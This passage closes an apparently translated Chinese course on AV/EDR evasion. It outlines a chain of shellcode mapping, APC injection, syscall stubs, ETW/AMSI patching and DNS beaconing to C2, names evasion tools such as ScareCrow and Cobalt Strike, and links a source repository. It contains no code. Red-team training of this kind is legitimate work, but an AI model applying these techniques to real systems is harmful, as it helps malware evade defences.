<p>通常与 <strong>牺牲进程</strong>（例如：<code>explorer.exe</code>、<code>svchost.exe</code>）结合使用，以掩盖 C2 行为。</p>
<hr>
<h3 id="10-示例：完整链式规避"><a href="#10-示例：完整链式规避" class="headerlink" title="10. 示例：完整链式规避"></a><strong>10. 示例：完整链式规避</strong></h3><ol>
<li><p>通过 <code>NtCreateSection</code> 映射 Shellcode</p>
</li>
<li><p>使用 APC 注入到伪造的父进程</p>
</li>
<li><p>通过系统调用存根调用 Shellcode</p>
</li>
<li><p>在负载运行前修补 ETW 和 AMSI</p>
</li>
<li><p>通过 DNS 信标检查并连接到 C2</p>
</li>
</ol>
<hr>
<h3 id="11-工具与框架"><a href="#11-工具与框架" class="headerlink" title="11. 工具与框架"></a><strong>11. 工具与框架</strong></h3><ul>
<li><p><strong>ScareCrow</strong> – 用于绕过 EDR 的 Shellcode 加载器</p>
</li>
<li><p><strong>Nim-Loader</strong> – 通过 Nim 实现 EDR 绕过</p>
</li>
<li><p><strong>Donut + Cobalt Strike</strong> – 将 PE 转换为 Shellcode，支持 AMSI&#x2F;ETW 绕过</p>
</li>
<li><p><strong>DInvoke</strong> – 从内存动态调用 P&#x2F;Invoke，无需静态导入</p>
</li>
</ul>
<hr>
<h3 id="12-红队技巧"><a href="#12-红队技巧" class="headerlink" title="12. 红队技巧"></a><strong>12. 红队技巧</strong></h3><ul>
<li><p>随机化进程&#x2F;线程名称和创建标志</p>
</li>
<li><p>使用 <code>CreateProcessAsUser</code> 进行更隐蔽的进程启动</p>
</li>
<li><p>利用 <strong>LOLBins</strong>（Living Off the Land Binaries）避免检测</p>
</li>
</ul>
<hr>
<h3 id="总结-10"><a href="#总结-10" class="headerlink" title="总结"></a><strong>总结</strong></h3><p>行为规避是 <strong>了解 EDR 思维方式的游戏</strong>。虽然通过混淆可以实现基于签名的规避，但绕过行为检测 <strong>需要操控时机、系统调用和进程行为</strong>。掌握这些技术使红队能够在高安全环境中隐蔽操作，避免被检测。</p>
<h1 id="模块-10-–-结尾"><a href="#模块-10-–-结尾" class="headerlink" title="模块 10 – 结尾"></a>模块 10 – 结尾</h1><h2 id="AV-EDR规避实战技巧-源代码项目"><a href="#AV-EDR规避实战技巧-源代码项目" class="headerlink" title="AV&#x2F;EDR规避实战技巧 - 源代码项目"></a>AV&#x2F;EDR规避实战技巧 - 源代码项目</h2><h3 id="仓库"><a href="#仓库" class="headerlink" title="仓库"></a>仓库</h3><p>源代码示例 - GitHub：<a target="_blank" rel="noopener" href="https://github.com/CyberSecurityUP/AV-EDR-Evasion-Practical-Techniques-Course">https://github.com/CyberSecurityUP/AV-EDR-Evasion-Practical-Techniques-Course</a></p>
<hr>
<h3 id="特别感谢"><a href="#特别感谢" class="headerlink" title="特别感谢"></a>特别感谢</h3><ul>
<li><p>Saad Ahla - <a target="_blank" rel="noopener" href="https://github.com/SaadAhla/">GitHub</a></p>
</li>
<li><p>Bl4ckM1rror - <a target="_blank" rel="noopener" href="https://github.com/Bl4ckM1rror">GitHub</a></p>
</li>
<li><p>Boku7 - <a target="_blank" rel="noopener" href="https://github.com/boku7">GitHub</a></p>
</li>
<li><p>Sektor7 - <a target="_blank" rel="noopener" href="https://institute.sektor7.net/">Institute</a></p>
</li>
<li><p>Cocomelonc - <a target="_blank" rel="noopener" href="https://cocomelonc.github.io/">Website</a></p>
</li>
<li><p>NUL0x4C - <a target="_blank" rel="noopener" href="https://github.com/NUL0x4C/HellShell">GitHub</a></p>
</li>
<li><p>Ricardo JoseRf - <a target="_blank" rel="noopener" href="https://github.com/ricardojoserf/SharpObfuscate">GitHub</a></p>
</li>
<li><p>Logan Goins - <a target="_blank" rel="noopener" href="https://github.com/logangoins">GitHub</a></p>
</li>
<li><p>White Knight Labs - <a target="_blank" rel="noopener" href="https://github.com/WKL-Sec">GitHub</a></p>
</li>
<li><p>Cyberwarfare Labs - <a target="_blank" rel="noopener" href="https://www.cyberwarfare.live/">Website</a></p>
</li>
<li><p>SecOps Group - <a target="_blank" rel="noopener" href="https://secops.group/">Website</a></p>
</li>
<li><p>Helvio Junior - <a target="_blank" rel="noopener" href="https://github.com/helviojunior/">GitHub</a></p>
</li>
</ul>
<h2 id="AV-EDR规避实战技巧-结论"><a href="#AV-EDR规避实战技巧-结论" class="headerlink" title="AV&#x2F;EDR规避实战技巧 - 结论"></a>AV&#x2F;EDR规避实战技巧 - 结论</h2><h3 id="结论与最终思考"><a href="#结论与最终思考" class="headerlink" title="结论与最终思考"></a><strong>结论与最终思考</strong></h3><p>通过本课程，我们深入探讨了 Windows 平台上的进攻性安全技巧。从直接的系统调用到高级规避技术，如卸载钩子、系统调用存根、ETW 绕过和硬件断点，内容重点是为进攻性操作员和红队专业人员提供实际操作的能力。</p>
<p>本课程的目标不仅是介绍技术，还要培养一种工程思维——能够理解、适应并击败现代 EDR 和 AV 解决方案，特别是在高度监控的环境中。本课程旨在让学员能够以类似现实世界威胁的方式，构建自己的工具、加载器和执行链。</p>
<p>通过本课程，你应该能够：</p>
<ul>
<li><p>识别并分析用户态和内核级别的监控机制。</p>
</li>
<li><p>使用本地 Windows 内部机制绕过遥测和检测。</p>
</li>
<li><p>利用低级技术（汇编、系统调用、驱动程序）设计负载和加载器。</p>
</li>
<li><p>在实验室环境中安全使用 <strong>BYOVD（Bring Your Own Vulnerable Driver）</strong> 技术。</p>
</li>
<li><p>开发自定义实现，如 NTDLL 存根、进程空洞化、APC 注入等。</p>
</li>
</ul>
<p>掌握这些技术需要时间、实践和纪律。始终记住：能力越大，责任越大。请在研究、防御和提升安全环境的过程中，使用你的知识，做到合乎伦理。</p>
<hr>
<h3 id="感谢"><a href="#感谢" class="headerlink" title="感谢"></a><strong>感谢</strong></h3><p>感谢你投入时间、精力和专注于这门高级训练。</p>
<p>你对 Windows 操作系统进攻性安全的热情和专业精神，表明了你对学习的承诺。无论你是红队成员、恶意软件分析师，还是安全研究员，本课程中所培养的技能将成为你更深入的研究和实际操作的基础。</p>
<p>继续学习、探索，拓展自己的能力边界。最重要的是——保持敏锐，保持好奇，保持合乎伦理。</p>
<p><strong>下次任务再见。</strong></p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/%E5%85%8D%E6%9D%80%E6%8A%80%E6%9C%AF/" class="category-chain-item">免杀技术</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/%E5%85%8D%E6%9D%80%E5%9F%B9%E8%AE%AD/" class="print-no-link">#免杀培训</a>
      
        <a href="/tags/%E5%85%8D%E6%9D%80%E6%8A%80%E6%9C%AF/" class="print-no-link">#免杀技术</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>AV/EDR规避实用技术</div>
      <div>https://sh1yan.top/2025/12/09/Practical-AVEDR-Evasion-Techniques/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>shiyan</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2025年12月9日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2025/04/01/Certified-Red-Team-Operator-(CRTO)-Notes/" title="CRTO - 红队操作员备忘单 (Cobalt Strike) - 2024">
                        <span class="hidden-mobile">CRTO - 红队操作员备忘单 (Cobalt Strike) - 2024</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a  rel="nofollow noopener"><span>Copyrights &copy; 2016-2025</span></a> <i class="iconfont icon-love"></i> <a  rel="nofollow noopener"><span>shiyan</span></a> 
    </div>
  
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
